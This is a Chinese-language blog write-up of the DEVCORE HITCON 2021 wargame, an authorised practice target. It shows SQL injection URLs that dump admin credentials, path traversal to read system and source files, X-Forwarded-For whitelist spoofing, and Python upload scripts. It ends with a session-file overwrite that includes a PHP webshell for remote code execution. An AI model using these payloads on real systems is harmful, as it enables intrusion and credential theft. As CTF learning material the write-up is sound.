# [DEVCORE @HITCON2021] Wargame Web Challenge


嗚嗚 好想拿 <font color="#46D62D"><b>MASTER OF WEBSEC</b></font>，但實力不允許我挑戰這個頭銜QQ  
今年是我第二次參加 HITCON，現場活動真的是多到很難全部都摸過一遍 : D

<!--more-->

![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638291990/blog-posts/2021-12/01-cover.webp)
DEVCORE Wargame 活動說明: https://hackmd.io/@d3vc0r3/hitcon2021


## 閒聊

![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp)


這次 HITCON 2021 我除了跑完官方活動的「**駭客貓歷險記**」還有「**駭客喵喵 & 駭客貓行動**」，剩下有認真摸的就是 DEVCORE Wargame，畢竟當初看到戳到 4 個 flag 的前 60 位有[NFT 成就](https://opensea.io/collection/hitcon2021-x-devcore)可以拿，雖然平常沒有在用這類的區塊鏈，但獎勵聽起來就很帥XD

###### (另外中華資安的 CTF 前三名還送 OSCP 的培訓課程，但那個難度... QQ)

這次要感謝 @stavhaygn 和 @splitline 兩位願意給 hint，也感謝 @arikoi 願意聽我訴戳不出來的苦XDDD


## Description

你是一名滲透測試專家，並且剛接受到一份委託，需要對一個網站進行滲透測試，測試期限至 11/27 為止。由於有時程、預算等壓力以及階段性的安排，客戶希望優先尋找 Server-Side 相關的漏洞。因此你的任務就是在時程內找出可能有風險的 Server-Side 漏洞並交出一份滲透測試報告！

#### 備註說明

- 每個弱點都是依據真實發生的案例所準備的，可以嘗試想像現代網站會如何部署、有什麼樣的架構，以此作為思維出發點。
- 每送出一把 flag 就會解鎖報告中的一個弱點章節，章節內有弱點細節、修補建議的範例文字，解完題後還能體驗一下實務報告樣貌的感覺唷！
- 作為一名專業的 Pentester，你必須讓客戶值得信任，所以不能惡意破壞系統或是刪除、覆蓋任何非你新增的檔案、資料庫內容，造成系統無法運作。
  - 如果違反規則，破壞系統或惡意干擾其他參加者，將會被取消所有領獎資格。


## Solution
目標網站是個影印機訂購網站，填完資料就能到訂單資訊的頁面，並且可以查看收據明細&列印。而設計上總共有六個弱點可以拿到 flag，整個過程算是花費了不少時間，這篇會盡量省略不必要的遠路（~~絕對不是因為我忘記了~~），官方的滲透測試報告放在最下方供各位參考。

![](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638207053/blog-posts/2021-12/01-overview.webp)

<br>

~~起手式是 @stavhaygn~~，他在匯出 PDF 的頁面找到有 SQLi 的漏洞，原網址如下。

```url {linenos=false}
http://web.ctf.devcore.tw/print.php?id=35640&sig=4ufNcDscM0YTLDrd0gDyqDJCx8EPJh1kyq1ghUc6ZPztC0xmq96CPQ5vk8l2LBDi
```


![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-print.php.webp)

### 弱點 2：Broken Access Control

這部分我原本認為訂單編號會因為驗後面那串`sig`而沒辦法戳 [IDOR](https://en.wikipedia.org/wiki/Insecure_direct_object_reference)，但事實上在我們戳 SQLi 的過程，被 @stavhaygn 戳到第一筆訂單有 flag。

```url {linenos=false}
http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E&id=3456055 union select id,name,email,phone,status,sig_hash,order_date,address,note FROM orders where id = 1
```

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp)

不過送出去發現官解是**無效的存取控管**，根本也不需要 SQLi 這麼麻煩，還真的是不小心撿到XDDD


### 弱點 3：SQL Injection

至於 SQLi 的戳法可以參考 [NSYSU 駭客攻防 HW 0x02 Writeups](../../2020/nsysu-htcf-hw2/#news-160-points) ，使用 `Union Select` 的 SOP 大致相同這裡就不再贅述，資料庫結構如下。

```bash
web
  |-- items
    |- id
    |- title
    |- description
  |-- rate_limit
    |- ip
    |- last_visit
    |- visit_times
  |-- orders
    |- id
    |- name
    |- email
    |- phone
    |- status
    |- sig_hash
    |- order_date
    |- address
    |- note
  |-- options
    |- key
    |- value
  |-- backend_users
    |- id
    |- username
    |- password
    |- description
```

歐對了，別輕易拿 sqlmap 直接 -\-dump 硬爆資料庫，裡頭的訂單資料量會多到浪費時間 Zzzzz  


```url {linenos=false}
http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E&id=3456055 union select 1,@@version,id,GROUP_CONCAT(username),5,6,GROUP_CONCAT(password),GROUP_CONCAT(description),9 FROM backend_users
```

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp)

從 backend_users 的 admin 拿到 flag，同時也順便拿到明文 password（怕）  
另外沒想到同一招 SQLi 可以戳出兩個 flag，蠻有意思的XD

### 弱點 1：Path Traversal


從首頁的圖片發現後面帶有參數`id`，用 base64 還原後是該圖片的檔名，原網址如下。

```url {linenos=false}
http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
```

簡單測試後知道這邊有 LFI 的漏洞，但這部分我摸了好長一段時間，除了要多層 base64 很麻煩，另外路徑也是當通靈題在摸== 給各位看看我的 terminal 的一部分截圖（~~順便曬ㄍ星姐~~），結果其實根本不通靈，**只要你懂網站，網站就會幫助你**（？）

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp)

最後大致測出 root 在 `../../../../`，而且官方還特地在 `/etc/passwd` 放了 hint 真是謝囉XD

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp)

靠著 @stavhaygn 通靈前端在 `../frontend/` ，也順勢找到了 `image.php` 的 source code。

```php {filename="/frontend/image.php"}
<?php

require_once('include.php');

$id = $_GET['id'];
$file = base64_urlsafe_decode($id);
$file = IMAGE_PATH . $file;

if (!file_exists($file)) {
    http_response_code(404);
} else {
    header('Content-Type: ' . mime_content_type($file));
    readfile($file);
}
```


之後也一直都在通靈找有可能埋 flag 的路徑，還找到一些奇怪路徑（像是`/usr/share/file/magic/` ），直到 @stavhaygn 問了句「你那為啥那麼客氣不拿其他 .php？」...嗯很有道理，最後還真的在 `include.php` 找到 flag，原來這裡才是第一關。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206387/blog-posts/2021-12/01-flag1.webp)

### 弱點 4：Use of Less Trusted Source

至此， @stavhaygn 似乎也碰到瓶頸。

所以我跑去找第一名的 splitline 社工一波，得到了關鍵字 `/proc/mounts`，這份檔案記錄著當前系統掛載的資訊，說實在我根本不會想到要去翻這東西，有經驗的大大果然就是不一樣。

```file {filename="/proc/mounts"}
...
/dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
...
```

檔案載下來可以看到在 `/dev/sda` 有一些常見的系統檔案，還有 @stavhaygn 通靈出來的 `/usr/share/nginx/frontend` ，但最讓我在意的是 `/usr/share/nginx/b8ck3nd` ... 這後端路徑設計明顯就是不想讓你通靈吧www

直接戳 `http://web.ctf.devcore.tw/b8ck3nd/index.php` 發現會被 302 導回首頁，所以我決定繼續用 LFI 翻翻看後台的 source code。最後在 `../../../../b8ck3nd/include.php` 找到 IP 白名單，也很明顯的是要從 `/b8ck3nd/login.php` 登入進後台。

```php {filename="/b8ck3nd/include.php"}
<?php

require_once('../frontend/include.php');

session_start_once();

if (!in_array(get_client_ip(), ['127.0.0.1', '172.18.11.89'], true)) {
    header('Location: /');
    exit();
}

if (!isset($_SESSION['user_id'])) {
    if (!endsWith($_SERVER['SCRIPT_FILENAME'], 'login.php')) {
        header('Location: /b8ck3nd/login.php');
        exit();
    }
}
```

下一步就是想辦法偽造 IP 戳後台頁面，最直觀的方法就是用 Burp 直接攔截封包改 header，但是嘗試一段時間雖然能摸到登入頁面，但發現效果不彰，除了找不到 Auto add parameter 的方式要一直手動複製貼上，很多時候封包送出去後網站還是繼續轉圈圈，之後改用 Google 套件 [ModHeader](https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj/)，真的方便！

再來後台帳號密碼，可以從 弱點 3 的 SQLi 的 backend_users 拿到，順利登入後就能直接看到 flag 了。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-flag4.webp)


### 弱點 5：Unrestricted File Upload

在 LFI 翻找 source code 的過程可以找到 `/b8ck3nd/upload.php`，原本用途應該是上傳圖片，但沒意外這裡應該是讓我們塞後門用的XD

```php {filename="/b8ck3nd/upload.php"}
<?php

require_once('include.php');

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    header('Content-Type: text/plain');
    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk';
    exit();
}

if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
    header('Content-Type: application/json; charset=utf-8');
    $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    $filename = random_str(32).'.'.$ext;
    if (isset($_POST['rename'])) {
        $filename = $_POST['rename'];
    }
    if (isset($_POST['folder'])) {
        $folder = $_POST['folder'];
        if (!file_exists(IMAGE_PATH.$folder)) {
            mkdir(IMAGE_PATH.$folder);
        }
        $filename = $folder.'/'.$filename;
    }
    $filepath = IMAGE_PATH . $filename;
    move_uploaded_file($_FILES['file']['tmp_name'], $filepath);
    system("rsync_wrap ".escapeshellarg($filepath));
    $id = base64_urlsafe_encode($filename);
    echo json_encode([
        'default' => '/image.php?id='.$id
    ]);
} else {
    http_response_code(400);
}
```

從 source code 可以看到若用 `GET` 的方式上傳會噴一串 JWT 給你，這邊直接用 python requests 上傳檔案。由於同樣會先過 `include.php` 的檢查，所以參數的部分該給的 IP 和 cookies 記得要放，這裡我是手動 admin 登入後再複製 cookies，想想應該有更好的寫法。

另外，從 line 15 - 23 可以發現系統允許我們**自訂檔名**還有**上傳 folder**，原本我還傻傻的想說用不到就沒注意，直到後面戳不出來，Arikoi 就問了句「如果可以上傳 folder，那你要不要試試上傳點點斜」 ...... 真是好主意呢，結果只要把檔案存在非預設路徑（`/images/`），flag 就會自己噴出來（比想像中還快==），另外下面路徑就能透過 LFI 進行確認上傳的檔案。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638291731/blog-posts/2021-12/01-flag5.webp)

###### （當時的 code 僅供參考）

```python {filename="backdoor.py"}
import requests

url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php'
headers = {'X-Forwarded-For': '172.18.11.89'}
cookies = {'PHPSESSID': '<PHPSESSID>'}
files = {'file': open('test.php', 'rb')}
data = {'folder': '../tmp', 'rename': 'test.php'}

r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data)

print(r.status_code)
print(r.text)
```


### 弱點 6：Local File Inclusion

雖然說是這麼說，但上面的做法透過 LFI 進行確認上傳檔案會發現是 404，同時上傳到 `/frontend/` 或 `/b8ck3nd/` 也是一樣的情況，表示除了 `/images/` 以外都不給上傳檔案（從 `/proc/mounts` 其實也可以看到前後端的目錄都是 read-only 不給寫檔），也難怪上一題除了噴 flag 還問了一句

{{< admonition type=warning open=open >}}
Now, can you get shell?
{{< /admonition >}}

> 戳不到後門，那到底還有哪裡可以放檔案呢？

這是我當時心中的疑問，從滲透測試報告的弱點 5 其實有暗示 `/tmp/pwn.php`，動手實驗後也確認可以上傳檔案（但不能直接存取），不過對於如何操作所謂的 "**RCE**" 就很陌生了。我平常 CTF 都只能戳戳簡單的小兒科，鮮少摸到複雜的 WebSec，因此對於這 RCE 整個過程是相當模糊的。

這裡我參考了兩篇文章 from RCE to LFI 的文章：
- [透過 LFI 引入 PHP session 檔案觸發 RCE](https://cyku.tw/lfi-leads-to-rce-via-session-file/)
- [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)

其實重點在於登入後系統會在 server 端啟用 session 功能（預設路徑為 `/tmp/sess_{SESSIONID}` ），先隨意用一組 cookies 透過 LFI 看到內容是 `lang|s:5:"zh-tw";user_id|s:1:"1";`，根據上面第二篇的說法，可以嘗試從 lang 下手。

回頭看看 `/frontend/include.php`，可以發現似乎在 session 有些線索可循，包括預設會透過 `require_once` 引入 `langs/zh-tw.php`，不過載下來是個空檔案，當時我的思路卡在這裡， @stavhaygn 還打趣的表示「官方感覺就是故意引導你，告訴你這裡怪怪的ㄡ」。

```php {filename="/frontend/include.php"}
...

define('DEFAULT_LANGUAGE', 'zh-tw');
define('ALLOWED_LANGUAGE', 'zh-tw');

function session_start_once() {
    if (!isset($_SESSION)) { 
        session_start();
    }
}

session_start_once();

if (!isset($_SESSION['lang'])) {
    $_SESSION['lang'] = DEFAULT_LANGUAGE;
}

require_once('langs/' . $_SESSION['lang'] . '.php');

...
```

<br>

這裡我大概陷入約 2 小時的撞牆期，因為沒搞懂 RCE 後門的操作方式，所以一直想把 webshell 塞到 `/tmp/sess_{SESSIONID}`，然後再透過 LFI 主動去執行後門，最後證明想法接近但使用後門的方式不對。

整理之後思路大致如下，由於每一次請求都會先執行 `require_once('include.php');`，而 language 會根據 session 決定要載入哪個 `langs/` 的 PHP 檔，若能夠利用這個"載入 PHP"的漏洞把 `zh-tw.php` 換成 `shell.php` 之類的，就能執行程式達成我們要的 RCE 。

但該怎麼做呢？
我想這部分可以分成 **上傳後門** 和 **使用後門** ，而這兩部分都會透過 `upload.php` 操作。

#### (1) 上傳後門

code 其實都差不多，後門的上傳位置我放在伺服器的 `/tmp/cyris.php`，只要能戳到就好。
（本機端 `test.php` 的內容可以先放個 `<?php system("ls -al"); ?>` 或 `<?php phpinfo(); ?>` 方便確定結果）

```python {filename="backdoor.py"}
import requests

cookie = '<PHPSESSID>'
url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php'
headers = {'X-Forwarded-For': '172.18.11.89'}
cookies = {'PHPSESSID': cookie}
files = {'file': open('test.php', 'rb')}
data = {'folder': '../../../../../../tmp', 'rename': 'cyris.php'}

r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data)

print(r.status_code)
print(r.text)
```

> P.S. 很想用 cyris.php 在 DEVCORE 機器內留名的我

#### (2) 使用後門

有了後門，那就要想辦法觸發！
這裡我們自己寫個 `sesseion` 檔案把伺服器內的 `/tmp/sess_{SESSIONID}` 覆寫成我們的形狀w，內容大概像這樣 `lang|s:27:"../../../../../../tmp/cyris";user_id|s:1:"1";` 注意除了格式要對，也要是能戳到後門的路徑。

```python {filename="exploit.py"}
import requests

cookie = '<PHPSESSID>'
url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php'
headers = {'X-Forwarded-For': '172.18.11.89'}
cookies = {'PHPSESSID': cookie}
files = {'file': open('session', 'rb')}
data = {'folder': '../../../../../../tmp', 'rename': 'sess_'+cookie}

r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data)

print(r.status_code)
print(r.text)
```

沒意外直接 LFI 就能看到結果。
![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638297938/blog-posts/2021-12/01-rce.webp)


之後就能一路透過後門找 flag，可以用 `<?php system($_GET['cmd']); ?>` 就可以直接用 GET 下指令，例如：

```url
http://web.ctf.devcore.tw/image.php?id=<filepath_base64>&cmd=../../../../readflag2
```

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340322/blog-posts/2021-12/01-flag6.webp)

看起來寫得很精簡，但這部分花掉了我整個晚上的時間，尤其蓋 session 一直蓋爛，然後經驗太少又沒有 debug 方向，感謝 @stavhaygn 耐心的指引，後面燒掉好多腦細胞QwQ


之後用 RCE 跑去翻 `/tmp/`，除了 session 還有很多其他人遺留的後門，我也留名做個紀念（順便清掉自己留的一堆爛掉ㄉ測試檔）XDDD
![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp)

## 後記

不得不說這種用 flag 逐步解鎖滲透報告的想法，個人覺得很棒。而且整個過程也都有脈絡可循，只是經驗不夠還是很容易像我通靈亂戳，要需要找人求救 QQ。在會場和 DEVCORE 交流時得知其實題目整組就是 RCE 的連續技，只是在滲透的過程中會撿到 Flag，很喜歡這種學技術的感覺，只是若要自己重現系統環境感覺不容易，不然放到自架的 CTFd 感覺應該很不錯。

此外就是體會到 LFI 的嚴重性，過去打 CTF 都只覺得危險程度在機敏資料外洩，沒想到搭配 PHP Sessions 可以做出 RCE ，直接把手伸進系統內真的好可怕>"<


最後附上官方用心製作的滲透測試報告XD

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638293282/blog-posts/2021-12/01-challenge.webp)

